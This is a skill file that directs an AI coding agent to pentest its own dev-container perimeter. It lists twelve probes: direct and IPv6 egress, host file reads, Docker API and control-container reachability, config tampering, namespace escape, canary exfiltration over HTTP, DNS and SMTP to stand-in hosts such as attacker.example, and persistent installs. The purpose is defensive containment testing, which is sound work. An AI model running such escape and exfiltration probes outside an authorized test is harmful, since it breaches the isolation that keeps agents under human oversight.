---
name: security-test
description: >
  Adversarial pentest of the dev-container security perimeter. Runs a fixed set
  of escape / exfiltration / tamper probes from inside the development container
  and reports HELD (blocked = good) / BYPASS (got through = finding) per test.
  Portable across Claude Code, opencode, and the GitHub Copilot CLI. Use when the
  user says "run the pentest", "security test", "/security-test", or asks to
  validate the container isolation.
---

You are a red-team security researcher. Your job is to determine whether this
**development container's security perimeter holds** against an adversary running
as `devuser` inside it. Work through every test below **in order**, run the
probes, observe the real results, and report findings in the required format.

## Read this before you start

- **Verdict semantics are inverted.** This is a *containment* test: a blocked /
  failed attempt is a **PASS** (the perimeter HELD). An attempt that **succeeds**
  is a **BYPASS** — a security finding. Do not "fix" a failing command or retry
  it through another route to make it work; a failure is the desired outcome and
  you must record it as HELD.
- **Non-destructive only.** Every probe here reads, connects, or attempts a
  write that is expected to be denied. Do **not** delete data, kill processes,
  or modify real config. The only thing you ever transmit outward is the
  **canary string** defined below — never a real secret.
- **You will hit permission prompts.** Each agent (Claude/opencode/Copilot) will
  ask the human to approve the shell commands. That is expected — approve them to
  proceed. Tell the user up front to also **watch the firewall block feed**
  during the run: `curl -s http://firewall:8099` (recent denials) and/or the
  dashboard at `http://127.0.0.1:8088` on the host.
- **What you cannot do yourself.** You run *inside* the container with no Docker
  socket, so you cannot `docker restart`/rebuild to test persistence, and you
  cannot reconfigure the firewall. Where a test needs that, infer what you can
  (see Test 9) and emit a **Host follow-up** note for the human.
- **Canary for exfiltration:** use the literal string
  `CANARY-EXFIL-TEST-do-not-allowlist-7f3a` everywhere a test sends data out.
  Never put a real credential on the wire.

## Environment facts (ground truth — confirm, don't assume)

- The dev container is on an **internal-only** Docker network (`internal: true`):
  no default route to the internet. All HTTP/HTTPS egress is forced through the
  Squid proxy at `http://firewall:3128`, which enforces a default-deny allowlist.
- A blocked HTTP/HTTPS request returns a `403` with an `ERR_FIREWALL_BLOCKED`
  body. Raw non-HTTP TCP (e.g. SMTP) has **no route** at all — it should fail to
  connect, not return 403.
- `firewall:8099` (block feed) and `firewall:3128` (proxy) are the only intended
  ways to reach the firewall container; `/policy` is **not** mounted into this
  container. The control container (dashboard `:8088`) is on a separate network.
- Perimeter files under `/workspace/.devcontainer/` (`firewall/`, `control/`,
  `Dockerfile`, `post-create.sh`, `post-start.sh`, `docker-compose.yml`,
  `devcontainer.json`, `.env`, `initialize.sh`) are bind-mounted **read-only**.

---

## Tests — run each, in order

For every test: record the exact command(s), the observed result, the verdict
(**HELD** / **BYPASS**), and a severity (`info` / `low` / `med` / `high` /
`crit`) for any BYPASS.

### 1. Direct egress bypass (skip the proxy)
- `curl -s -m 10 --noproxy '*' https://example.com` — try to reach the internet
  ignoring the proxy env.
- Raw TCP to a public IP: `timeout 10 bash -c 'exec 3<>/dev/tcp/1.1.1.1/443 && echo open || echo blocked'`.
- DNS-based exfil attempt: `getent hosts $RANDOM.example.com` then a lookup that
  would tunnel data, e.g. `nslookup ${CANARY}.example.com` (expect resolution to
  fail or not exfiltrate).
- **HELD =** no direct connection; only the proxy can reach allowlisted hosts.

### 2. Host filesystem read
- Attempt to read: `/etc/shadow`, `/proc/1/environ`, `/host`, `/run/secrets`,
  and anything under `/` outside `/workspace` and `/home/devuser`.
- **HELD =** files are absent or permission-denied; no host secrets readable.

### 3. Docker host reachability
- `ip route` — is there a default route / gateway at all?
- If a gateway exists, `ping -c1 -W2 <gateway>` and
  `timeout 5 bash -c 'exec 3<>/dev/tcp/<gateway>/2375'` (Docker API).
- **HELD =** no route to the host / gateway; Docker daemon unreachable.

### 4. Control container reachability
- Try to discover and reach the control container and its dashboard:
  `getent hosts control`, `curl -s -m 5 http://control:8088`,
  `curl -s -m5 --noproxy '*' http://127.0.0.1:8088`.
- **HELD =** control is not resolvable/reachable from the dev container (it is on
  a separate network).

### 5. Firewall / perimeter config tamper
- Attempt to write each: `touch /workspace/.devcontainer/firewall/squid.conf`,
  append to a `features/*.list`, `touch /workspace/.devcontainer/docker-compose.yml`,
  `.../devcontainer.json`, `.../development/Dockerfile`, `.../development/post-start.sh`.
- **HELD =** every write fails with "Read-only file system".

### 6. Privilege / namespace escape
- `id` (confirm non-root), then try: `unshare --map-root-user --net true`,
  `nsenter -t 1 -m`, `mount -t tmpfs none /mnt 2>&1`, and creating a device node
  `mknod /tmp/x b 7 0`.
- **HELD =** all fail (no `CAP_SYS_ADMIN`, non-root, restricted).

### 7. Allowlist / firewall-policy tamper
- Is the policy volume exposed here? `ls -la /policy 2>&1`, `mount | grep -i policy`.
- Try to influence policy from inside: attempt to write `/policy/features.state`
  and `/policy/allowlist.acl.perm` (expect absent/denied); confirm there is **no**
  in-container path to `fw allow` / `fw feature` (those are host/firewall-side).
- **HELD =** `/policy` is not mounted into the dev container and cannot be
  modified from here; the allowlist can only change from the host/firewall.

### 8. Credential exfiltration (canary only)
- **Presence check (read only, do not transmit):** note whether
  `printenv ANTHROPIC_API_KEY` is set and whether `~/.claude/settings.json`
  exists/contains a key. Report only *that a secret is present*, never its value.
- **Exfil attempt with the canary:** try to send `${CANARY}` outward by every
  channel — `curl -s -m10 -X POST -d "k=$CANARY" https://not-on-allowlist.example.com`,
  the same with `--noproxy '*'`, and a DNS channel `nslookup $CANARY.attacker.example`.
- **HELD =** reading a secret may be possible locally, but **no channel can send
  even the canary out** (HTTP/HTTPS → 403; raw/DNS → no route). A real secret
  therefore cannot leave the container.

### 9. Persistent executable install
- `npm install -g cowsay`, `pipx install httpie`, and `gh extension install <any>`
  — record whether each *succeeds* (registries may be allowlisted, so install can
  succeed).
- For any that succeed, **classify persistence from the mount table** rather than
  restarting: find the install dir (`npm root -g`, `~/.local/bin`,
  `~/.local/share/gh`) and check `grep "$dir" /proc/mounts`. A path that is a
  **named volume** survives a rebuild (a finding); a path on the **writable
  layer** (not in `/proc/mounts`) is discarded on rebuild (expected/acceptable).
- Note `brew` is not installed (expected — there is no Homebrew prefix).
- **HELD =** installs land on the writable layer (lost on rebuild), i.e. nothing
  installable here survives a rebuild or hides from the image. A BYPASS = an
  install dir backed by a named volume.
- **Host follow-up (cannot self-verify):** the human should `docker restart` and
  then rebuild the dev container and confirm the test packages are gone after the
  rebuild.

### 10. Mail sending
- Raw SMTP / submission to external mail servers (classic non-HTTP exfil that
  skips the proxy): for `aspmx.l.google.com:25`, `smtp.gmail.com:587`,
  `smtp.gmail.com:465` run
  `timeout 8 bash -c 'exec 3<>/dev/tcp/<host>/<port> && echo open || echo blocked'`.
- HTTP mail APIs (these *do* traverse the proxy): `curl -s -m10 -X POST
  https://api.sendgrid.com/v3/mail/send` and `https://api.mailgun.net/v3/...`.
- **HELD =** raw SMTP has no route (cannot connect) **and** mail APIs return `403`
  from the proxy. The agent cannot send email by any path.

### 11. IPv6 proxy bypass
- Show the v6 posture: `ip -6 addr`, `ip -6 route` (expect no global address / no
  default v6 route).
- Try to egress over v6, bypassing the v4 proxy: `curl -6 -s -m10 https://[2606:4700:4700::1111]/`,
  `curl -6 -s -m10 --noproxy '*' https://ipv6.google.com/`, and a raw v6 socket
  `timeout 8 bash -c 'exec 3<>/dev/tcp/2606:4700:4700::1111/443 && echo open || echo blocked'`.
- **HELD =** no global IPv6 connectivity and no v6 route to the internet — the
  proxy cannot be bypassed over IPv6.

### 12. VS Code Server / extension attack surface
A VS Code extension is code that runs *automatically* — a malicious or
compromised one is a leak vector. **Workspace** extensions run inside this
container as `devuser` (so they are subject to the firewall), but they can read
anything `devuser` can (API keys, `~/.claude/settings.json`, the workspace) and
auto-execute on attach. Probe the in-container portion (do **not** install real
malware — only confirm access, then clean up):
- Locate the server and extensions dir: `ls -ld ~/.vscode-server/extensions`.
- **Auto-run persistence:** confirm whether a rogue process could plant an
  auto-loaded extension — `mkdir -p ~/.vscode-server/extensions/.pentest-marker`
  then classify persistence via the mount table
  (`grep vscode-server /proc/mounts`); remove the marker afterward
  (`rm -rf ~/.vscode-server/extensions/.pentest-marker`). A **named volume** =
  survives a rebuild (finding); **writable layer** (not in `/proc/mounts`) =
  lost on rebuild.
- **Extension egress is firewalled:** since the extension host runs in-container,
  an extension's egress to a non-allowlisted host is blocked — cross-reference
  Tests 1 and 8 (no separate probe needed).
- **Residual exfil channel:** show that an *allowlisted/baseline* domain is
  reachable and could be abused as an exfil tunnel by an extension:
  `curl -so /dev/null -w '%{http_code}\n' https://marketplace.visualstudio.com`
  (expect `200`, not `403`).
- **HELD =** extension code is non-root and firewalled (no non-allowlisted
  egress), and a planted extension is lost on rebuild. **RESIDUAL (info, not a
  FAIL):** workspace extensions auto-run on attach, can read local secrets, and
  can exfiltrate over *allowlisted* domains — mitigate by vetting/pinning
  extensions in `devcontainer.json`, keeping the allowlist minimal (disable
  unused feature-sets to shrink exfil channels), and rebuilding to clear
  `~/.vscode-server`. Report a **BYPASS** only if the extensions dir is backed
  by a named volume (would survive a rebuild) or if non-allowlisted egress
  somehow succeeds.

---

## Report format

Print a single results table, then the verdict and findings:

```
| # | Test | Command(s) | Observed | Verdict | Severity |
|---|------|-----------|----------|---------|----------|
| 1 | Direct egress bypass | ... | connection refused / 403 | HELD | - |
| ... |
```

Then:

- **Overall: PASS** (all HELD) **or FAIL** (one or more BYPASS).
- **Findings:** for each BYPASS — what got through, why it matters, severity, and
  a suggested fix. If none, state "No bypasses observed."
- **Host follow-up:** list the checks the human must run on the host (the
  restart/rebuild persistence confirmation from Test 9, and reviewing the
  firewall block feed / Squid deny log for the attempts logged during this run).
- **Which tool ran this:** note whether you are Claude Code, opencode, or Copilot
  CLI, and any test you could not run in this environment (record it as SKIPPED,
  not HELD).

## Known limitations

- Kernel-level exploits are out of scope (best-effort only in Test 6).
- Timing / TTL side-channel exfiltration is not tested.
- Persistence across rebuild (Tests 9 and 12) is inferred from the mount table
  here and must be confirmed by the host follow-up step.
- **UI / host VS Code extensions run on the host, outside this container and the
  firewall** — they are out of scope for this in-container test entirely. Test 12
  covers only workspace (in-container) extensions. A malicious host extension is
  a host compromise; see the README "VS Code extensions" warning.
